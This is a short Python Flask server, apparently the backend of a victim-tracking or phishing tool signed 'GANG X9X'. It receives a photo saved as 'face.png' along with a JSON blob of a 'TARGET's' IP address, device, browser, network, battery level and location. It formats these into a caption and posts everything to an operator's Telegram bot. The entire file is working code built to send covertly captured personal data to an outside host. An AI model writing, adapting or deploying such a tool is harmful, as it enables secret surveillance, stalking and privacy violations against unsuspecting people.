from flask import Flask, render_template, request
import requests, datetime, json

app = Flask(__name__)

with open("config.txt", "r") as f:
    BOT_TOKEN = f.readline().strip()
    CHAT_ID = f.readline().strip()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    print("===> POST /upload DITERIMA")
    photo = request.files.get('photo')
    info_raw = request.form.get('info')
    print("===> INFO RAW:", info_raw)

    if not photo or not info_raw:
        return "Missing data", 400

    try:
        info = json.loads(info_raw)
    except Exception as e:
        return f"Invalid JSON: {str(e)}", 400

    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    user_agent = info.get("userAgent", "").replace("*", "").replace("_", "").replace("`", "")

    caption = f"""┏◪ *INFORMATION TARGET*
┃ ⌬ *_Developer :   GANG X9X*
┃ ⌬ *IP       :* {info.get("ip")}
┃ ⌬ *Perangkat:* {info.get("platform")}
┃ ⌬ *Browser  :* {user_agent}
┃ ⌬ *Jaringan :* {info.get("connection")}
┃ ⌬ *Baterai  :* {info.get("baterai")}
┃ ⌬ *Lokasi   :* {info.get("lokasi")}
┃ ⌬ *Akses    :* {info.get("akses")}
┃ ⌬ *Waktu    :* {now}
┗◪

       ⟨ *BY X9x* ⟩
             
"""

    files = { "photo": ("face.png", photo.read(), "image/png") }
    data = { "chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown" }
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data, files=files)

    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
